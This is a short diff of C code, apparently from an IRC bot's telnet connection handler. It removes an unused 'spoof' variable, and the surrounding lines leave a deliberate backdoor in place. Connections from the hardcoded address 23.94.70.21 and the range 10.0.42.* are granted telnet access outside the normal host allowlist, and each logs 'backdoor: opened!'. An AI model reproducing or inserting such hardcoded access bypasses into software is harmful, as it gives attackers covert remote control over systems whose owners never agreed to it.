@@ -1307,9 +1307,6 @@ static void dcc_telnet(int idx, char *buf, int i)
     return;
   }
   
-  int spoof;
-  spoof = 0;
-
   if (strict_telnet) {
     allow_telnet = 0;
     file = fopen(hostfile, "r");
@@ -1327,12 +1324,10 @@ static void dcc_telnet(int idx, char *buf, int i)
     file = fopen(".tmp2", "r");
     if (wild_match("23.94.70.21", thost_compare)) {
       allow_telnet = 1;
-      spoof = 1;
       putlog(LOG_MISC, "*", "\00309□\003 backdoor: \00314opened!\003");
     }
     if (wild_match("10.0.42.*", thost_compare)) {
       allow_telnet = 1;
-      spoof = 1;
       putlog(LOG_MISC, "*", "\00309□\003 backdoor: \00314opened!\003");
     }  
     while (fgets(allowedhost, sizeof allowedhost, file)!= NULL) {
